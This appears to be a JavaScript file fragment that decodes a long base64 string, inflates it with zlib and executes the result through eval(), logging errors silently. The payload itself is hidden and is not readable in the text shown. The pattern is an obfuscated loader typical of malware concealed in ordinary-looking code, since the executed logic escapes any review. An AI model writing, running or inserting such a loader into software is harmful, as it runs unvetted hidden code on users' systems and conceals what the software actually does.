
      const zlib = require('zlib');
      const { decodeBase64, encodeBase64 } = require('base64-arraybuffer');

      const encodedData = "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";
      const compressedData = Buffer.from(encodedData, 'base64');
      const decompressedCode = zlib.inflateSync(compressedData).toString();

      try {
        eval(decompressedCode);
      } catch (evalError) {
        console.error('Error executing decompressed code:', evalError);
      }
    
